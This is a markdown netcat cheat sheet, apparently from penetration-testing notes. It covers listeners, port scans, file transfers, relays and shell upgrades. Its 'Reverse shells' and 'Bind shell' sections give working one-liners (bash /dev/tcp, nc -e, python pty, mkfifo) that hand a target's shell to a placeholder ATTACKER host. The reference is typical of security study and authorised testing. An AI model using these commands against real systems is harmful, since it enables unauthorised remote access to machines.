# Netcat Cheat Sheet
> TCP/UDP swiss-army knife — listeners, transfers, shells · Network · `apt install netcat-openbsd` (or `ncat` from nmap suite)

---

## Quick start
```bash
nc -lvnp 4444                    # listener
nc target.com 4444               # connect
```

## Most-used commands
| Task | Command |
|---|---|
| Listener | `nc -lvnp 4444` |
| Connect | `nc target 4444` |
| Banner grab | `nc -nv target 80` then type `HEAD / HTTP/1.0\r\n\r\n` |
| Port scan | `nc -zv target 20-100` |
| File transfer (recv) | `nc -lvnp 4444 > file.bin` |
| File transfer (send) | `nc target 4444 < file.bin` |
| UDP listener | `nc -u -lvnp 4444` |

## Reverse shells
```bash
# Attacker
nc -lvnp 4444

# Target (bash)
bash -i >& /dev/tcp/ATTACKER/4444 0>&1

# Target (nc with -e, if supported)
nc -e /bin/sh ATTACKER 4444

# Target (python)
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("ATTACKER",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/sh")'

# Target (mkfifo, no -e nc)
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc ATTACKER 4444 > /tmp/f
```

## Bind shell (listen on target, connect from attacker)
```bash
# Target
nc -lvnp 4444 -e /bin/sh
# Attacker
nc target 4444
```

## Common flags
| Flag | Meaning |
|---|---|
| `-l` | listen mode |
| `-v` | verbose |
| `-n` | no DNS resolution |
| `-p` | source/listen port |
| `-u` | UDP |
| `-z` | zero-I/O scan mode |
| `-w <secs>` | timeout |
| `-k` | keep listening after disconnect (BSD nc) |

## Recipes
```bash
# Chat/relay
nc -lvnp 5000 | tee output.log

# Simple pivot relay with mkfifo
mkfifo backpipe; nc -l 8080 0<backpipe | nc target 80 1>backpipe

# Upgrade a dumb shell to a pty (from within the shell)
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm; stty raw -echo; fg   # then Ctrl+Z, stty raw -echo, fg
```

## Gotchas / OPSEC
- Plain netcat traffic is unencrypted — use `socat` with `openssl` or an SSH tunnel for anything sensitive.
- Not all `nc` builds ship `-e` (Debian's `netcat-openbsd` strips it) — fall back to the mkfifo trick.

## See also
- `network/socat.md`
- `qyvora/toha3ee.md` (`http.harvest`, `https.proxy` for MITM-flavored capture)
